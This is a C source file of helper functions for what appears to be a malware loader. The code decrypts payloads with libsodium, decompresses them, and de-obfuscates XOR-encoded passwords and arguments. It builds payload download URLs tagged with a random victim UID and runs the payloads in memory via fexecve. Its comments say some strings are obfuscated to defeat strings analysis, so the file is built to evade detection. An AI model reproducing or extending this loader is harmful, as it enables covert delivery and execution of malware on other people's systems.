/**
 * Holds all helper functions needed for loader operation.
 * 
 * Authors: Robert Weiner, James Cogswell, Elitania Venturella
 */

#include "helpers.h"

/**
 * @brief Get size in bytes of given file.
 * @param fp: File pointer to get file size from.
 * @retval Size of the file.
 */
int fsize(FILE *fp)
{
    int prev = ftell(fp);
    fseek(fp, 0L, SEEK_END);
    int sz = ftell(fp);
    fseek(fp, prev, SEEK_SET); //go back to where we were
    return sz;
}

/**
 * @brief Execute payload in memory.
 * @param payload_fd: File descriptor holding payload.
 * @param payload_argv: Argv array for payload.
 * @param payload_envp: Envp array for payload.
 * @retval Return 1 on success, 0 on failure.
 */
int executePayload(int payload_fd, char **payload_argv, char **payload_envp)
{
    if (fexecve(payload_fd, (char *const *)payload_argv, (char *const *)payload_envp) == -1)
    { // execute payload
        return 0;
    }
    return 1;
}

/**
 * @brief Simply write payload to given file name.
 * @param payload: Data to write to disk.
 * @param pathToWrite: Destination file to write to.
 * @param size: Size of payload to write.
 * @retval None
 */
void writeToDisk(void *payload, char *pathToWrite, int size)
{
    FILE *outfile = fopen(pathToWrite, "w");
    fwrite(payload, sizeof(char), size, outfile);
    fclose(outfile);
}

/**
 * @brief Decrypt the payload.
 * @param encrypted: The input encrypted payload.
 * @param input_length: The length of the encrypted payload.
 * @param original_size: The length of the decrypted payload.
 * @param key: The symmetric key for decryption.
 * @retval Return NULL if error, decrypted payload otherwise.
 */
unsigned char *decrypt(unsigned char *encrypted, unsigned int input_length, unsigned int original_size, unsigned char *key)
{
    unsigned char encrypted_msg[input_length - 24];
    unsigned char nonce[24];

    const unsigned int ciphertext_len = original_size + 16;

    unsigned char *decrypted = calloc(original_size, sizeof(unsigned char));

    if (sodium_init() == -1)
    {
        return NULL;
    }

    // Extract the nonce
    for (int i = 0; i < input_length; i++)
    {
        if (i > 23)
        {
            encrypted_msg[i - 24] = encrypted[i];
        }
        else
        {
            nonce[i] = encrypted[i];
        }
    }

    if (crypto_secretbox_open_easy(decrypted, encrypted_msg, ciphertext_len, nonce, key) != 0)
    {
        return NULL;
    }

    return decrypted;
}

/**
 * @brief Decompress the payload using miniz.
 * @param decrypted: The input compressed decrypted payload.
 * @param uncomp_len: Length of the uncompressed payload.
 * @param compressed_len: Length of input compressed payload.
 * @retval Returns the uncompressed payload.
 */
unsigned char *decompress(unsigned char *decrypted, uLong uncomp_len, uLong compressed_len)
{
    unsigned char *uncompressed = (mz_uint8 *)malloc((size_t)uncomp_len);

    uncompress(uncompressed, &uncomp_len, decrypted, compressed_len);
    free(decrypted);

    return uncompressed;
}

/**
 * @brief Extracts a 4 byte unsigned big endian integer from the payload.
 * @note Converts from big endian to little endian.
 * @param payload: Pointer to 4 byte unsigned big endian integer to extract.
 * @retval 4 byte unsigned little endian integer.
 */
unsigned int extractInt(unsigned char *payload)
{
    unsigned int toRet = (payload[0] | payload[1] << 8 | payload[2] << 16 | payload[3] << 24);
    return toRet;
}

/**
 * @brief Pads the password from preferences.h with '#', or truncates if too long.
 * @retval Will always return a 32 byte unsigned char array, unless there is a heap error.
 */
unsigned char *psswdPadding()
{
    int len;
    char pad = '#';
    unsigned char *psswd = malloc(32);
    unsigned char decoded[strlen(ENC_PASSWORD)];

    if (psswd == NULL)
    {
        return NULL;
    }

    len = strlen(ENC_PASSWORD);

    // XOR de-obfuscate the password held in preferences.h
    for (int i = 0; i < len; i++)
    {
        decoded[i] = ENC_PASSWORD[i] ^ 0x8F;
    }

    //add padding if necessary
    if (len < 32)
    {
        memcpy(psswd, decoded, len);
        memset(psswd + len, pad, 32 - len);
    }
    else // truncate if too long
    {
        memcpy(psswd, decoded, 32);
    }

    return psswd;
}

/**
 * @brief Formats the base URL with the payload to send and the UID.
 * @param payload: Name of the payload to be requested.
 * @param uid: The UID to send with request.
 * @retval Formatted URL unless there is a heap error.
 */
char *formatURL(char *payload, char *uid)
{
    char *formattedURL = calloc(strlen(PAYLOAD_URL) + strlen(payload) + 70, 1);

    if (formattedURL == NULL)
        return NULL;

    strcpy(formattedURL, PAYLOAD_URL);
    strcat(formattedURL, payload);
    strcat(formattedURL, "&uid=");
    strcat(formattedURL, uid);

    return formattedURL;
}

/**
 * @brief Generates a random 64 byte alpha-numeric UID string.
 * @retval Random 64 byte alpha-numeric UID string.
 */
char *genUID()
{
    // alphaNums is simply a-zA-Z0-9 XOR'd with 0xF0 to show on strings analysis
    char *alphaNums = "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9";
    char *uid = calloc(65, sizeof(char));
    FILE *urand = fopen("/dev/urandom", "r");
    unsigned char buff[64];
    fread(buff, 1, 64, urand);
    fclose(urand);

    if (uid == NULL)
        return NULL;

    for (int i = 0; i < 64; i++)
        uid[i] = alphaNums[buff[i] % 62] ^ 0xF0;

    return uid;
}

/**
 * @brief Counts the number of payloads defined in the instructions file.
 * @note Counts based on the number of spaces + 1.
 *       Accounts for arbitrary number of spaces between or before payloads.
 * @param payloads: String holding space delimited list of payload names.
 * @retval Number of payload names held in payloads string.
 */
size_t countPayloads(char *payloads)
{
    size_t numPayloads = 0;
    char start = 0;
    for (int i = 0; i < strlen(payloads); i++) // count number of payloads to allocate
    {
        if (!start) // if first payload not found yet
        {
            if (payloads[i] != ' ')
            {
                start = 1;
                continue;
            }
            else
            {
                continue;
            }
        }
        if ((payloads[i] == ' ') && (payloads[i + 1] != ' ') && (payloads[i + 1] != '\0')) // check for erronious whitespace
        {
            numPayloads += 1;
        }
    }
    return ++numPayloads;
}

/**
 * @brief Counts the number of lines in the instructions file.
 * @param payloads: The instuructions file as a single string.
 * @retval Numer of lines in the instructions file
 */
size_t countLines(char *payloads)
{
    size_t numPayloads = 0;
    for (int i = 0; i < strlen(payloads); i++)
    {
        if (payloads[i] == ';')
        {
            numPayloads++;
        }
    }
    return numPayloads;
}

/**
 * @brief Parses the payload names out of the instructions file.
 * @param payloads: String holding space delimited list of payload names.
 * @param numPayloads: The number of payloads that will be held in the payloads string.
 * @param sep: Separator to tokenize on.
 * @retval Array of strings holding all payload names to retrieve. 
 */
char **parsePayloads(char *payloads, size_t numPayloads, char *sep)
{
    char **payloadNames;
    char *tok;

    payloadNames = calloc(numPayloads, sizeof(char *));
    // if there is only one payload, simply copy it over
    if (numPayloads == 1)
    {
        if (!strcmp(sep, ";"))
            payloads++;
        payloadNames[0] = calloc(strlen(payloads) + 1, sizeof(char));
        strcpy(payloadNames[0], payloads);
        payloads--;
    }
    // if multiple, tokenize and copy into string array
    else
    {
        tok = strtok(payloads, sep);
        int i = 0;
        while (tok != NULL)
        {
            payloadNames[i] = calloc(strlen(tok) + 1, sizeof(char));
            strcpy(payloadNames[i], tok);
            tok = strtok(NULL, sep);
            i++;
        }
    }
    // strip out potential erronious newline at the end
    for (int i = 0; i < numPayloads; i++)
    {
        for (int j = 0; j < strlen(payloadNames[i]); j++)
        {
            if (payloadNames[i][j] == '\r' || payloadNames[i][j] == '\n')
            {
                payloadNames[i][j] = '\0';
            }
        }
    }

    return payloadNames;
}

/**
 * @brief Frees all memory for the payloads array passed in.
 * @param payloads: Array of strings of payload names.
 * @param numPayloads: The number of payload strings in payloads.
 * @retval None
 */
void freePayloads(char **payloads, int numPayloads)
{
    for (int i = 0; i < numPayloads; i++){
        free(payloads[i]);
    }
    free(payloads);
}

/**
 * @brief Parse out the serialized metadata held at the beginning of the payload blob.
 * payloadOffset is incremented accordingly any time anything is extracted.
 *
 * @note Serialized metadata format is as follows:
 *  
 * First 4 bytes, count of blobs
 * Blob metas (as many as there are blobs) -
 *    4 byte  - (32 boolean flags)
 *     4 bytes - number of args in argv
 *     4 bytes - number of env vars in envp
 *     4 bytes - original file size
 *     4 bytes - compressed file size
 *     4 bytes - encrypted file size
 *     argv data (as many as there are argv)
 *         4 bytes - len of arg
 *         x bytes - arg
 *     envp data (as many as there are envp)
 *         4 bytes - len of env
 *         x bytes - env arg
 * Blobs (after all blob metas)
 * Raw compressed and encrypted payload blob bytes
 * 
 * @param payloadOffset: Pointer to serialized metadata.
 * @retval Array of filled PayloadStructs, or NULL if heap error.
 */
PayloadStruct *parseMeta(unsigned char **payloadOffset)
{
    PayloadStruct *payloadMeta;
    unsigned int numPayloads;
    unsigned int numArgv;
    unsigned int numEnvp;
    unsigned int numExtras;

    numPayloads = extractInt(*payloadOffset);
    *payloadOffset += 4;
    payloadMeta = (PayloadStruct *)calloc(numPayloads, sizeof(PayloadStruct)); //allocate array of pointers to point to arrays of payload metadatas

    if (payloadMeta == NULL)
    {
        return NULL;
    }

    for (int i = 0; i < numPayloads; i++)
    {
        // extract all integer metadata bytes
        payloadMeta[i].flags = extractInt(*payloadOffset);
        *payloadOffset += 4;
        numArgv = extractInt(*payloadOffset);
        *payloadOffset += 4;
        numEnvp = extractInt(*payloadOffset);
        *payloadOffset += 4;
        numExtras = extractInt(*payloadOffset);
        *payloadOffset += 4;

        payloadMeta[i].uncompressedLength = extractInt(*payloadOffset);
        *payloadOffset += 4;
        payloadMeta[i].decryptedLength = extractInt(*payloadOffset);
        *payloadOffset += 4;
        payloadMeta[i].encryptedLength = extractInt(*payloadOffset);
        *payloadOffset += 4;

        // extract argv, envp, and extras metadata sections
        extractStrArr(numArgv, &(payloadMeta[i].argv), payloadOffset, 1);

        extractStrArr(numEnvp, &(payloadMeta[i].envp), payloadOffset, 1);

        extractStrArr(numExtras, NULL, payloadOffset, 0);
    }
    return payloadMeta;
}

/**
 * @brief Extracts an array of strings from the serialized metadata.
 * Expects the input to follow structure of:
 *     4 bytes - length of current string,
 *     x bytes - string data (not null terminated),
 *     * repeats numStrs number of times *
 * @param numStrs: The amount of strings to extract into the array dest.
 * @param dest: Pointer to the destination string array.
 * @param payloadOffset: Pointer to serialized string array.
 * @param save: Boolean whether to save the string array or just parse over it.
 *              If 0, dest value is ignored. If 1, dest must point to a char **.
 * @retval None
 */
void extractStrArr(unsigned int numStrs, char ***dest, unsigned char **payloadOffset, char save)
{
    unsigned int currLen;

    if (save)
    {
        *dest = calloc(numStrs + 1, sizeof(char *));
        for (int j = 0; j < numStrs; j++)
        {
            // extract length, then copy string to array index
            currLen = extractInt(*payloadOffset);
            *payloadOffset += 4;
            (*dest)[j] = calloc(currLen + 1, sizeof(char));
            memcpy((*dest)[j], *payloadOffset, currLen);
            (*dest)[j][currLen] = '\0';
            *payloadOffset += currLen;

            //de-obfuscate with XOR 0xFE
            for (int k = 0; k < strlen((*dest)[j]); k++)
            {
                (*dest)[j][k] ^= 0xFE;
            }
        }
    }
    else
    {
        // if set to not save, simply iterate over the string array incrementing payloadOffset accordingly
        for (int j = 0; j < numStrs; j++)
        {
            currLen = extractInt(*payloadOffset);
            *payloadOffset += 4 + currLen;
        }
    }
}

/**
 * @brief Frees all memory from the heap for the PayloadStruct passed in.
 * @param payloadMeta: Pointer to PayloadStruct to free.
 * @retval None
 */
void freePayloadMeta(PayloadStruct *payloadMeta)
{
    int i = 0;
    while (payloadMeta -> argv[i] != NULL)
    {
        free(payloadMeta -> argv[i]);
        i++;
    }
    free(payloadMeta -> argv[i]);

    i = 0;
    while (payloadMeta -> envp[i] != NULL)
    {
        free(payloadMeta -> envp[i]);
        i++;
    }
    free(payloadMeta -> envp[i]);
    free(payloadMeta -> argv);
    free(payloadMeta -> envp);
    free(payloadMeta);
}